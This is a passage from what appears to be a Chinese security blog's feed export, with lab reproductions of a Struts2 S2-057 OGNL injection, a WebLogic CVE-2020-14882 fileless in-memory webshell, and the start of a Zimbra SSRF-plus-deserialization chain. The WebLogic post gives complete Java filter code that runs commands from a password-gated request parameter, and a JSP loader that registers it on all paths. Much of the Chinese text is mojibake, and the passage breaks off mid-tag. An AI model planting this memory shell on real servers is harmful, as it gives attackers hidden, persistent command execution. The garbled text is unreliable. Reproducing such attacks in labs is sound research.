<h3 id="å¯åŠ¨ç¯å¢ƒ"><a class="header-anchor" href="#å¯åŠ¨ç¯å¢ƒ">Â¶</a>å¯åŠ¨ç¯å¢ƒ</h3>
<p>strutsä¸ç”¨ç¼–è¯‘ï¼Œç›´æ¥å¯åŠ¨</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-048</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
<h3 id="æ­å»ºs2-057æ¼æ´ç¯å¢ƒ"><a class="header-anchor" href="#æ­å»ºs2-057æ¼æ´ç¯å¢ƒ">Â¶</a>æ­å»ºs2-057æ¼æ´ç¯å¢ƒ</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨id</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å®¹å™¨cf341620ead4ä¸­å¼€å¯ä¸€ä¸ªäº¤äº’æ¨¡å¼çš„ç»ˆç«¯</span></span><br><span class="line">docker <span class="built_in">exec</span> -i -t cf341620ead4 /bin/bash</span><br></pre></td></tr></tbody></table></figure>
<p><img src="dockerPs.png" alt="dockerPs"></p>
<figure class="highlight plaintext"><figcaption><span>ç¬”è®°</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">docker exec :åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤</span><br><span class="line">    -d :åˆ†ç¦»æ¨¡å¼: åœ¨åå°è¿è¡Œ</span><br><span class="line">    -i :å³ä½¿æ²¡æœ‰é™„åŠ ä¹Ÿä¿æŒSTDIN æ‰“å¼€</span><br><span class="line">    -t :åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯</span><br></pre></td></tr></tbody></table></figure>
<p>Struts 2.5.16å­˜åœ¨s2-057æ¼æ´ï¼Œä¸‹è½½Struts 2.5.16</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/tomcat/webapps/test</span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/webapps/test</span><br><span class="line">wget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip</span><br><span class="line">apt-get install unzip -y</span><br><span class="line"><span class="built_in">cp</span> struts-2.5.16/apps/struts2-showcase.war /usr/local/tomcat/webapps/</span><br></pre></td></tr></tbody></table></figure>
<h3 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a class="header-anchor" href="#ä¿®æ”¹é…ç½®æ–‡ä»¶">Â¶</a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">locate struts-actionchaining.xml</span><br></pre></td></tr></tbody></table></figure>
<p>å®é™…ä¸Šlocateå‘½ä»¤åœ¨æ­¤dockerå®¹å™¨ä¸­ä¸å­˜åœ¨ï¼Œæ”¹ç”¨findæŸ¥æ‰¾</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">toor@toor-virtual-machine:~$ find / -name struts-actionchaining.xml</span><br><span class="line">/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml</span><br><span class="line">/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></tbody></table></figure>
<p>ä¿®æ”¹è¿™ä¸ªä¸¤ä¸ªæ–‡ä»¶</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">vim /usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml</span><br><span class="line">bash: vim: <span class="built_in">command</span> not found</span><br><span class="line">apt install vim</span><br></pre></td></tr></tbody></table></figure>
<p><img src="error-vim.png" alt="error-vim"></p>
<p>ç»æŸ¥ï¼Œéœ€è¦å…ˆåŒæ­¥æºç´¢å¼•ï¼Œå†å®‰è£…</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt install vim</span><br></pre></td></tr></tbody></table></figure>
<p><code>&lt;struts&gt;&lt;/struts&gt;</code>æ•´ä¸ªæ ‡ç­¾æ›¿æ¢ä¸º</p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"actionchaining"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"actionChain1"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.showcase.actionchaining.ActionChain1"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"redirectAction"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="é‡å¯æœåŠ¡"><a class="header-anchor" href="#é‡å¯æœåŠ¡">Â¶</a>é‡å¯æœåŠ¡</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/bin/</span><br><span class="line">./shutdown.sh</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-048</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
<h2 id="0x03-éªŒè¯"><a class="header-anchor" href="#0x03-éªŒè¯">Â¶</a>0x03 éªŒè¯</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.1.59:8080/struts2-showcase/${(444+333)}/actionChain1.action</span><br></pre></td></tr></tbody></table></figure>
<p><img src="POC.png" alt="POC"></p>
<p>å½“å‰è¿™ä¸ªç‰ˆæœ¬è®¡ç®—å™¨å¼¹ä¸å‡ºï¼Œèƒ½å¼¹å‡ºçš„ç‰ˆæœ¬å°±ä¸æµ‹äº†ï¼Œå‚è€ƒé“¾æ¥é‡Œæœ‰</p>
<h2 id="0x04-å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#0x04-å‚è€ƒé“¾æ¥">Â¶</a>0x04 å‚è€ƒé“¾æ¥</h2>
<p><a href="http://www.freebuf.com/articles/system/180142.html">http://www.freebuf.com/articles/system/180142.html</a><br>
<a href="https://mp.weixin.qq.com/s?__biz=MzI2MTAxOTg1OQ==&amp;mid=2650049324&amp;idx=1&amp;sn=e5660c5720f17f0752e39ec0e533632c&amp;chksm=f260ea90c5176386a9346853df298cf926cd00f519bfde42c20d229444f6bd8552ca6b65449e&amp;mpshare=1&amp;scene=23&amp;srcid=0713GGhQHb4IUVNVYjUVZ5Oy#rd">https://mp.weixin.qq.com/s?__biz=MzI2MTAxOTg1OQ==&amp;mid=2650049324&amp;idx=1&amp;sn=e5660c5720f17f0752e39ec0e533632c&amp;chksm=f260ea90c5176386a9346853df298cf926cd00f519bfde42c20d229444f6bd8552ca6b65449e&amp;mpshare=1&amp;scene=23&amp;srcid=0713GGhQHb4IUVNVYjUVZ5Oy#rd</a><br>
<a href="https://github.com/jas502n/St2-057">https://github.com/jas502n/St2-057</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>å¤ç°</tag>
        <tag>struts2</tag>
        <tag>docker</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic - æ— æ–‡ä»¶å†…å­˜shell</title>
    <url>/2021/09/27/Weblogic-%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98shell/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a class="header-anchor" href="#ç¯å¢ƒæ­å»º">Â¶</a>ç¯å¢ƒæ­å»º</h2>
<p>é‡‡ç”¨<code>vulhub</code>ä¸­<code>weblogic</code> <code>CVE-2020-14882</code>æ­å»ºï¼Œ<code>vulhub</code>å®‰è£…ä¸èµ˜è¿°</p>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-<span class="number">2020</span>-<span class="number">14882</span>/</span><br><span class="line">sudo docker-compose up</span><br></pre></td></tr></tbody></table></figure>
<h2 id="å†…å­˜cmdå®ç°"><a class="header-anchor" href="#å†…å­˜cmdå®ç°">Â¶</a>å†…å­˜<code>cmd</code>å®ç°</h2>
<p>åŸç†å’Œæœºåˆ¶æ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹å‚è€ƒé“¾æ¥ï¼Œæ¯”è¾ƒè¯¦ç»†ï¼Œæˆ‘è·³è¿‡ï¼ˆå¤ªèœï¼Œçœ‹ä¸æ‡‚ğŸ˜­ï¼‰</p>
<p>å¤§è‡´æµç¨‹ä¸ºï¼šåŠ è½½æ¶æ„ç±»ï¼ŒåŠ¨æ€æ³¨å†Œ<code>filter</code></p>
<h3 id="1-ç¼–å†™æ¶æ„filterç±»"><a class="header-anchor" href="#1-ç¼–å†™æ¶æ„filterç±»">Â¶</a>1. ç¼–å†™æ¶æ„<code>filter</code>ç±»</h3>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼šweblogic, å†…å­˜é©¬å®ç°ï¼Œå†°è</p></div>
<span id="more"></span>
<p>æŠŠ<code>kuron3k0</code>çš„<code>cmd</code>ä»£ç æ‹¿å»ç¼–è¯‘ï¼Œä½¿ç”¨<code>vscode</code>ï¼Œä¿®å¤ä¸€ä¸‹é—®é¢˜ï¼Œç¼–è¯‘ï¼Œå¯¹<code>java</code>ä¸ç†Ÿï¼Œä¹Ÿæ˜¯é€šè¿‡è¿™æ¬¡å­¦ä¹ äº†å¾ˆå¤š<code>java</code>ç›¸å…³çŸ¥è¯†</p>
<p><code>vscode</code>ä¸­æ–‡ä»¶æ— çº¢è‰²æŠ¥é”™ï¼Œä¿å­˜ä¼šè‡ªåŠ¨ç¼–è¯‘åˆ°<code>output</code>ï¼ŒæŸ¥çœ‹<code>Configure Classpath</code>å³å¯æ‰¾åˆ°è·¯å¾„ï¼Œæ— éœ€å†æ‰‹åŠ¨<code>F5</code>ç¼–è¯‘ï¼Œå¦åˆ™ä¼šæç¤ºæ‰¾ä¸åˆ°ä¸»ç±»</p>
<p>æºä»£ç ä¸­ä¼šä½¿ç½‘ç«™æ‰€æœ‰è®¿é—®è¢«è¿‡æ»¤ï¼Œå¯¼è‡´æ‰§è¡Œåç½‘ç«™ä¼š500ï¼Œç¨ä½œä¿®æ”¹</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cmdFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span>{</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException {};</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException {</span><br><span class="line">   </span><br><span class="line">        System.out.println(<span class="string">"============== in evilfilter =============="</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> request.getParameter(<span class="string">"pwd"</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(pwd!=<span class="literal">null</span> &amp;&amp; cmd!=<span class="literal">null</span>){</span><br><span class="line">            <span class="keyword">if</span>(pwd.equals(<span class="string">"redn3ck"</span>)) {</span><br><span class="line">                System.out.println(<span class="string">"============== running cmd =============="</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next();</span><br><span class="line">                response.getOutputStream().println(result);</span><br><span class="line">                response.getOutputStream().flush();</span><br><span class="line">       </span><br><span class="line">            }<span class="keyword">else</span>{chain.doFilter(request, response);}</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{chain.doFilter(request, response);}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> {</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>ç¼–è¯‘å®Œæˆåï¼ŒæŠŠ<code>class</code>æ–‡ä»¶è½¬ä¸º<code>base64</code>ï¼Œç”¨<code>py</code>å®Œæˆ</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">toBase64</span>(<span class="params">file, txt</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">'rb'</span>) <span class="keyword">as</span> fileObj:</span><br><span class="line">        data = fileObj.read()</span><br><span class="line">        base64_data = base64.b64encode(data)</span><br><span class="line">        fout = <span class="built_in">open</span>(txt, <span class="string">'w'</span>)</span><br><span class="line">        fout.write(base64_data.decode())</span><br><span class="line">        fout.close()</span><br><span class="line"></span><br><span class="line">toBase64(<span class="string">r'C:\Users\Administrator\AppData\Roaming\Code\User\workspaceStorage\45d8f755763e840a79506c5be7b5e7b6\redhat.java\jdt_ws\cmd_7037b187\bin\cmdFilter.class'</span>, <span class="string">'out.txt'</span>)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="2-åŠ è½½æ¶æ„ç±»-åŠ¨æ€æ³¨å†Œfilter"><a class="header-anchor" href="#2-åŠ è½½æ¶æ„ç±»-åŠ¨æ€æ³¨å†Œfilter">Â¶</a>2. åŠ è½½æ¶æ„ç±»+åŠ¨æ€æ³¨å†Œ<code>filter</code></h3>
<p>ç”±äºæˆ‘ä»¬æ˜¯<code>webshell</code>ç¯å¢ƒï¼Œè‚¯å®šæ˜¯æ‰§è¡Œ<code>jsp</code>æœ€ä¸ºæ–¹ä¾¿ï¼Œæ‰€ä»¥ä½¿ç”¨<code>jsp</code>åŠ è½½åˆšæ‰ç”Ÿæˆçš„<code>base64</code>ï¼Œå¹¶åŠ¨æ€æ³¨å†Œ<code>filter</code></p>
<figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"c"</span> uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	<span class="type">byte</span>[] codeClass = java.util.Base64.getDecoder().decode(<span class="string">"yv66vgAAADQAfQcAAgEACWNtZEZpbHRlcg.."</span>);</span><br><span class="line">	<span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> (ClassLoader)Thread.currentThread().getContextClassLoader();</span><br><span class="line">	<span class="type">Method</span> <span class="variable">define</span> <span class="operator">=</span> cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(<span class="string">"defineClass"</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">	define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Class</span> <span class="variable">evilFilterClass</span>  <span class="operator">=</span> (Class)define.invoke(cl,codeClass,<span class="number">0</span>,codeClass.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ¨æ€æ³¨å†Œfilter</span></span><br><span class="line"></span><br><span class="line">	<span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">"weblogic.work.SystemFilter.cmd"</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Field</span> <span class="variable">cachedClassesF</span> <span class="operator">=</span> cl.getClass().getDeclaredField(<span class="string">"cachedClasses"</span>);</span><br><span class="line">	cachedClassesF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">cachedClass</span> <span class="operator">=</span> cachedClassesF.get(cl);</span><br><span class="line">	java.lang.reflect.<span class="type">Method</span> <span class="variable">putM</span> <span class="operator">=</span> cachedClass.getClass().getDeclaredMethod(<span class="string">"put"</span>, Object.class, Object.class);</span><br><span class="line">	putM.invoke(cachedClass, filterName, evilFilterClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–context</span></span><br><span class="line">	Class&lt;?&gt; executeThread = Class.forName(<span class="string">"weblogic.work.ExecuteThread"</span>);</span><br><span class="line">	java.lang.reflect.<span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> executeThread.getDeclaredMethod(<span class="string">"getCurrentWork"</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">currentWork</span> <span class="operator">=</span> m.invoke(Thread.currentThread());</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Field</span> <span class="variable">connectionHandlerF</span> <span class="operator">=</span> currentWork.getClass().getDeclaredField(<span class="string">"connectionHandler"</span>);</span><br><span class="line">	connectionHandlerF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> connectionHandlerF.get(currentWork);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">"request"</span>);</span><br><span class="line">	requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	obj = requestF.get(obj);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Field</span> <span class="variable">contextF</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">	contextF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> contextF.get(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨registerFilteræ³¨å†Œ</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">evilName</span> <span class="operator">=</span> <span class="string">"weblogic.system.method.cmd"</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Method</span> <span class="variable">getFilterManagerM</span> <span class="operator">=</span> context.getClass().getDeclaredMethod(<span class="string">"getFilterManager"</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">filterManager</span> <span class="operator">=</span> getFilterManagerM.invoke(context);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.<span class="type">Method</span> <span class="variable">registerFilterM</span> <span class="operator">=</span> filterManager.getClass().getDeclaredMethod(<span class="string">"registerFilter"</span>, String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);</span><br><span class="line">	registerFilterM.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	registerFilterM.invoke(filterManager, evilName, filterName, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/*"</span>}, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<div class="note warning">å‘ç‚¹ï¼šæœ€åä¸€è¡Œä»£ç ä¸­`url`éœ€è¦æ”¹ä¸º`new String[]{"/*"}`ï¼Œæ„ä¸ºå¯¹ç½‘ç«™æ‰€æœ‰ç›®å½•ç”Ÿæ•ˆ</div>
<p>æŠŠè¯¥<code>jsp</code>æ‹¿å»ç½‘ç«™ç›®å½•è®¿é—®å³å¯æ‰§è¡Œ</p>
<div class="note danger">æ³¨æ„ï¼š`jsp`åœ¨å“ªä¸ªç›®å½•æ‰§è¡Œï¼Œæœ€ç»ˆåˆ©ç”¨å°±åœ¨è¯¥ç›®å½•</div>
<p>åœ¨å…¶ä»–ç›®å½•åˆ©ç”¨ä¼šå¯¼è‡´ä¼ å‚å¤±è´¥ï¼Œè¯¥é—®é¢˜ä¹Ÿæ˜¯å‘äº†å¾ˆä¹…</p>
<p>æˆ‘åœ¨<code>/console/css/cmd.jsp</code>ç›®å½•ä¸‹æ‰§è¡Œï¼Œæ‰€ä»¥<code>/console/css/?pwd=redn3ck&amp;cmd=id</code></p>
<p><img src="cmd_ok.png" alt="cmd_ok"></p>
<h2 id="å†…å­˜webshellå®ç°"><a class="header-anchor" href="#å†…å­˜webshellå®ç°">Â¶</a>å†…å­˜<code>webshell</code>å®ç°</h2>
<p>åŸç†ä¸€æ ·ï¼Œç¼–è¯‘ä½œè€…æ”¹å¥½çš„å†°èé©¬ï¼ŒåŠ è½½å¹¶æ³¨å†Œå³å¯</p>
<p>ç¼–è¯‘æ—¶<code>weblogic.servlet.internal.ServletRequestImpl</code>å˜çº¢ï¼Œæ²¡æœ‰è¿™ä¸ªåº“ï¼Œå»ç¯å¢ƒä¸­æŠŠç›¸å…³jarå…¨éƒ¨æ‹¿å›</p>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">sudo <span class="built_in">find</span> / -name weblogic.jar</span><br><span class="line">cp /var/lib/docker/overlay2/d13f05c242a61c2ec44aea486b84d94793ad7026d83a52be9d990378d22453ff/merged/u01/oracle/wlserver/server/lib/*.jar /tmp/jar/</span><br><span class="line">chmod <span class="number">777</span> /tmp/jar/</span><br></pre></td></tr></tbody></table></figure>
<p><code>vscode</code>é…ç½®<code>Configure Classpath</code>ï¼Œé€‰ä¸­æ‰€æœ‰<code>jar</code>ï¼Œå³å¯ç¼–è¯‘æˆåŠŸ</p>
<p>æ‰§è¡Œ<code>jsp</code>åä½¿ç”¨å†°èè¿æ¥å‘ç°å¹¶ä¸æˆåŠŸï¼ŒæŸ¥çœ‹ç»ˆç«¯<code>log</code></p>
<p><img src="behinder_error.png" alt="behinder_error"></p>
<p>æç¤ºç¬¬30è¡Œç±»å‹è½¬æ¢å‡ºé”™ï¼Œé‚å°†ç±»å‹è½¬æ¢åˆ é™¤</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//map.put("response", ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());</span></span><br><span class="line">map.put(<span class="string">"response"</span>, response);</span><br></pre></td></tr></tbody></table></figure>
<p>é‡æ–°ç¼–è¯‘å¹¶æ‰§è¡Œï¼ŒæˆåŠŸï¼</p>
<p><img src="behinder_ok.png" alt="behinder_ok"></p>
<div class="note warning">éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸¤æ¬¡æ³¨å†Œçš„åå­—éœ€è¦æ›´æ”¹ï¼Œå¦åˆ™ä¼šæŠŠä¹‹å‰æ³¨å†Œçš„è¦†ç›–æ‰æˆ–è€…å¯¼è‡´ç½‘ç«™500</div>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">"weblogic.work.SystemFilter.behinder"</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilName</span> <span class="operator">=</span> <span class="string">"weblogic.system.method.behinder"</span>;</span><br></pre></td></tr></tbody></table></figure>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<p>è¯¥æ–¹å¼å¯å®ç°æ— æ–‡ä»¶<code>shell</code>ï¼Œå®‰å…¨æ€§å¤§å¤§æå‡ï¼Œä½†ç”±äºæ˜¯åŸºäºå†…å­˜ï¼Œé‡å¯æœåŠ¡å™¨å¿…ç„¶ä¼šæ¶ˆå¤±</p>
<p>å¦å¤–ï¼Œ<code>java</code>è¿™å—å¾ˆè–„å¼±ï¼Œæ„Ÿè°¢å®å“¥å¯¹æˆ‘çš„å¤§åŠ›å¸®åŠ©ï¼ç‘æ€æ‹œï¼Œä¸è‚‰ï¼</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p><a href="https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/">https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/</a><br>
<a href="https://paper.seebug.org/1249/">https://paper.seebug.org/1249/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>vulhub</tag>
        <tag>weblogic</tag>
        <tag>java</tag>
        <tag>shell</tag>
        <tag>æ— æ–‡ä»¶</tag>
      </tags>
  </entry>
  <entry>
    <title>Zimbra - SSRF+Memcached+ååºåˆ—åŒ–å¤ç°</title>
    <url>/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a class="header-anchor" href="#ç¯å¢ƒæ­å»º">Â¶</a>ç¯å¢ƒæ­å»º</h2>
<p>æˆ‘å°±ä¸æ­å»ºäº†ï¼Œå…¶å®æˆ‘æŒ‰ç…§ä½œè€…ç»™çš„æ­å»ºè¿‡ç¨‹ä¹Ÿæ²¡æ­å»ºæˆåŠŸï¼Œæˆ‘ç›´æ¥ä½¿ç”¨ä¸€ä¸ªç°æˆç¯å¢ƒæµ‹è¯•ã€‚</p>
<h2 id="åˆ©ç”¨æ¡ä»¶"><a class="header-anchor" href="#åˆ©ç”¨æ¡ä»¶">Â¶</a>åˆ©ç”¨æ¡ä»¶</h2>
<p>éœ€è¦è·å–åˆ°3ä¸ªå˜é‡</p>
<blockquote>
<p>zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity]</p>
</blockquote>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">Zimbra</span>, <span class="label success">ååºåˆ—åŒ–</span></p></div>
<span id="more"></span>
<p><code>accountId</code>ï¼šç”¨æˆ·çš„<code>ID</code>ï¼Œé€šè¿‡ç™»é™†zimbraè·å–<br>
<code>folderNo</code>ï¼š2ï¼Œä»£è¡¨<code>inbox</code><br>
<code>modseq</code>å’Œ<code>uidvalidity</code>é€šè¿‡ç™»é™†imapè·å–</p>
<h2 id="æ­¥éª¤"><a class="header-anchor" href="#æ­¥éª¤">Â¶</a>æ­¥éª¤</h2>
<h3 id="1-è®¾ç½®zimbraMemcachedClientServerList"><a class="header-anchor" href="#1-è®¾ç½®zimbraMemcachedClientServerList">Â¶</a>1. è®¾ç½®zimbraMemcachedClientServerList</h3>
<blockquote>
<p>Imapçš„<code>zimbraMemcachedClientServerList</code>é»˜è®¤ä¸ºç©ºï¼Œæ— æ³•ä½¿ç”¨<code>ImapSession</code>çš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±å‘½ä»¤è¡Œè®¾ç½®</p>
</blockquote>
<p>webç¯å¢ƒå½“ç„¶æ²¡åŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Œæ ¹æ®ä½œè€…çš„æ€è€ƒï¼Œ<code>ModifyServer</code>å¯å®ç°é€šè¿‡webä¿®æ”¹ã€‚</p>
<figure class="highlight xml"><figcaption><span>ModifyConfigRequest</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span><span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - FF52 (Win)"</span>/&gt;</span><span class="tag">&lt;<span class="name">session</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"3129324"</span>/&gt;</span><span class="tag">&lt;<span class="name">format</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"js"</span>/&gt;</span><span class="tag">&lt;<span class="name">csrfToken</span> <span class="attr">xmlns</span>=<span class="string">""</span>&gt;</span>0_62c250d442e69ba3a624ac1bea96dac8648b86f6<span class="tag">&lt;/<span class="name">csrfToken</span>&gt;</span><span class="tag">&lt;/<span class="name">context</span>&gt;</span><span class="tag">&lt;/<span 